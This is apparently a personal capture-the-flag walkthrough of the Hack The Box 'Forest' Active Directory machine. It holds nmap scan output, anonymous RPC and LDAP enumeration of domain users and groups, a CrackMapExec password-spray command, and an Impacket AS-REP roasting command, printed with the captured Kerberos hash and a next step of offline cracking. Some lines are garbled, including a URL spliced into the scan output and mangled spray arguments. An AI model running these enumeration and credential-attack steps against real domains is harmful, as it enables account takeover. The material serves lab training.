###############
Forest
Medium Level
RPC Enum:
    https://www.hackingarticles.in/active-directory-enumeration-rpcclient/
LDAP Enum:
    https://medium.com/@gokulg.me/introduction-92199491c808

CrackMapExec:
    https://github.com/byt3bl33d3r/CrackMapExec/wiki/Using-Credentials

###############

1-Enummeration:
    └─$ nmap -T2 -sV -sC -Pn 10.129.95.210 -v
        PORT     STATE SERVICE      VERSION
        53/tcp   open  domain       Simple DNS Plus
        88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-10-14 21:56:04Z)
        135/tcp  open  msrpc        Microsoft Windows RPC
        139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
        389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
        445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
        464/tcp  open  kpasswd5?
        593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
        636/tcp  open  tcpwrapped
        3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
        3269/tcp open  tcpwrapped
        Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows


        |_http-title: Not Found
        |_http-server-header: Microsoft-HTTPAPI/2.0
        9389/tcp  open     mc-nmf       .NET Message Framing
        10760/tcp filtered unknown
        47001/tcp open     http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
        |_http-title: Not Found
        |_http-server-header: Microsoft-HTTPAPI/2.0
        49664/tcp open     msrpc        Microsoft Windows RPC
        49665/tcp open     msrpc        Microsoft Windows RPC
        49666/tcp open     msrpc        Microsoft Windows RPC
        49668/tcp open     msrpc        Microsoft Windows RPC
        49670/tcp open     msrpc        Microsoft Windows RPC
        49680/tcp open     ncacn_http   Microsoft Windows RPC over HTTP 1.0
        49681/tcp open     msrpc        Microsoft Windows RPC
        49684/tcp open     msrpc        Microsoft Windows RPC
        49697/tcp open     msrpc        Microsoft Windows RPC
        Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

        Host script results:
        | smb2-security-mode: 
        |   3:1:1: 
        |_    Message signing enabled and required <<<<<<------- OH NOOOOOOOOWWWWWWWWWWWWWWWWWWWW
        | smb-security-mode: 
        |   account_used: <blank>
        |   authentication_level: user
        |   challenge_response: supported
        |_  message_signing: required
        | smb2-time: 
        |   date: 2025-10-14T21:58:05
        |_  start_date: 2025-10-14T21:54:36
        |_clock-skew: mean: 2h26m51s, deviation: 4h02m29s, median: 6m50s
        | smb-os-discovery: 
        |   OS: Windows Server 2016 Stanhttps://medium.com/@gokulg.me/introduction-92199491c808dard 14393 (Windows Server 2016 Standard 6.3) <<<<<<------- Win Version 6.3
        |   Computer name: FOREST
        |   NetBIOS computer name: FOREST\x00
        |   Domain name: htb.local <<<<<<------- Domain Name
        |   Forest name: htb.local
        |   FQDN: FOREST.htb.local
        |_  System time: 2025-10-14T14:58:03-07:00


    # Port 135 RCP - https://www.hackingarticles.in/active-directory-enumeration-rpcclient/:
        Try RPC connection:
            rpcclient -U "" -N 10.129.95.210
                rpcclient $> enumdomusers
                    user:[Administrator] rid:[0x1f4]
                    user:[Guest] rid:[0x1f5]
                    user:[krbtgt] rid:[0x1f6]
                    user:[DefaultAccount] rid:[0x1f7]
                    user:[sebastien] rid:[0x479]
                    user:[lucinda] rid:[0x47a]
                    user:[svc-alfresco] rid:[0x47b]
                    user:[andy] rid:[0x47e]
                    user:[mark] rid:[0x47f]
                    user:[santi] rid:[0x480]

                rpcclient $> enumdomgroups
                    group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
                    group:[Domain Admins] rid:[0x200]
                    group:[Domain Users] rid:[0x201]
                    group:[Domain Guests] rid:[0x202]
                    group:[Domain Computers] rid:[0x203]
                    group:[Domain Controllers] rid:[0x204]
                    group:[Schema Admins] rid:[0x206]
                    group:[Enterprise Admins] rid:[0x207]
                    group:[Group Policy Creator Owners] rid:[0x208]
                    group:[Read-only Domain Controllers] rid:[0x209]
                    group:[Cloneable Domain Controllers] rid:[0x20a]
                    group:[Protected Users] rid:[0x20d]
                    group:[Key Admins] rid:[0x20e]
                    group:[Enterprise Key Admins] rid:[0x20f]
                    group:[DnsUpdateProxy] rid:[0x44e]
                    group:[Organization Management] rid:[0x450]
                    group:[Recipient Management] rid:[0x451]
                    group:[View-Only Organization Management] rid:[0x452]
                    group:[Public Folder Management] rid:[0x453]
                    group:[UM Management] rid:[0x454]
                    group:[Help Desk] rid:[0x455]
                    group:[Records Management] rid:[0x456]
                    group:[Discovery Management] rid:[0x457]
                    group:[Server Management] rid:[0x458]
                    group:[Delegated Setup] rid:[0x459]
                    group:[Hygiene Management] rid:[0x45a]
                    group:[Compliance Management] rid:[0x45b]
                    group:[Security Reader] rid:[0x45c]
                    group:[Security Administrator] rid:[0x45d]
                    group:[Exchange Servers] rid:[0x45e]
                    group:[Exchange Trusted Subsystem] rid:[0x45f]
                    group:[Managed Availability Servers] rid:[0x460]
                    group:[Exchange Windows Permissions] rid:[0x461]
                    group:[ExchangeLegacyInterop] rid:[0x462]
                    group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
                    group:[Service Accounts] rid:[0x47c]
                    group:[Privileged IT Accounts] rid:[0x47d]
                    group:[test] rid:[0x13ed]
            
            rpcclient $> querydominfo
                Domain:		HTB
                Server:		
                Comment:	
                Total Users:	105

            rpcclient $> querygroup 0x200 (using the RID)
                Group Name:	Domain Admins
                Description:	Designated administrators of the domain
                Group Attribute:7
                Num Members:1

            rpcclient $> queryuser svc-alfresco
                user_rid :	0x47b
                group_rid:	0x201
                acb_info :	0x00010210
                fields_present:	0x00ffffff
                logon_divs:	168
                bad_password_count:	0x00000000
                logon_count:	0x00000006

            rpcclient $> getdompwinfo
                min_password_length: 7
                password_properties: 0x00000000


    

    # Port 445 SMB:
        # enumera shares (anonymous)
            smbclient -L //10.129.95.210 -N     
                Anonymous login successful

                Sharename       Type      Comment
                ---------       ----      -------
                Reconnecting with SMB1 for workgroup listing.
                do_connect: Connection to 10.129.95.210 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
                Unable to connect with SMB1 -- no workgroup available

        # or with account
            smbclient -L //10.129.95.210 -U 'FOREST\\USER' 
                Nothing here too


    # Port 636/389 Enumerateldaps - https://medium.com/@gokulg.me/introduction-92199491c808: 
        ldapsearch -x -h 10.129.95.210 -s base
       
        # Querying LDAP Anonymously - If anonymous access is allowed, you can pull domain details:
        ldapsearch -h 10.129.95.210 -x -s base namingContexts
            dn:
                namingContexts: DC=htb,DC=local
                namingContexts: CN=Configuration,DC=htb,DC=local
                namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
                namingContexts: DC=DomainDnsZones,DC=htb,DC=local
                namingContexts: DC=ForestDnsZones,DC=htb,DC=local

                *-LLL: LDIF output without comments.
                -x: simple bind (anonymous).
                -H ldap://IP: LDAP server.
                -b “” -s base: base search on RootDSE.
                namingContexts: attribute containing the DNs of the domain(s) (e.g., dc=htb,dc=local).

        # Extracting Users from LDAP
        ldapsearch -x -H ldap://10.129.95.210 -b "DC=htb, DC=local" "(objectClass=person)" cn
            # Sebastien Caron, Exchange Administrators, Information Technology, Employees, 
            htb.local
            dn: CN=Sebastien Caron,OU=Exchange Administrators,OU=Information Technology,OU
            =Employees,DC=htb,DC=local
            cn: Sebastien Caron

        We have our users list:
            └──╼ [★]$ cat users.txt
                svc-alfresco
                sebastien
                lucinda
                svc-alfresco
                andy
                mark
                santi

        We can try to Passwd Spray - https://github.com/byt3bl33d3r/CrackMapExec/wiki/Using-Credentials:
            crackmapexec smb 10.129.95.210 -u usernusers.txeame -p modified_password.txt

        We can also try:
            python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip 10.129.95.210 htb.local/svc-alfresco -no-pass

            Runs Impacket’s GetNPUsers.py against the domain controller at 10.129.95.210.
            -no-pass tells the script you don’t have the account password (attempts anonymous/no-preauth request).

            The script requests AS-REP responses for accounts that have Kerberos pre-authentication disabled.
            For vulnerable accounts the DC returns an AS-REP blob (format $krb5asrep$...), which the script saves/prints.

            We get the TGT:
                [*] Getting TGT for svc-alfresco
                    $krb5asrep$23$svc-alfresco@HTB.LOCAL:457244551e22e2779b6ddb622f720fc5$c44f49a353a37a1a1105b76be6ead2f7bdbabe1fe9bad30bdfc70737fc7cbd0276c91d27ddd1acbf6a98091825af032e24d31642e6faa4473f77ad8c689f4f2b5c0358188fdd6d61944f41ca68fa624902560ba17ae6a5dad9fdb9bb21a1de31342a001b1fe2fc59a03877cb10ae73c8e27727d173be150cac198f808968c15cd736f4ac73dd5b901970c8cea90fafabf8bd0bed4e3c70b228539a6d8ee85a4e495fea31c6ece4ec156b829f3e8caa7f13d3ea8af0196c653efb468a0de382253fc0a42201cf842deae46b3fd4135a934eeb057d56191f1cd97e475ba3e7de3c260ca9e0e845

        Next Step:
            Crack offline with John/hashcat to recover the account password (no noisy online brute force against the DC).







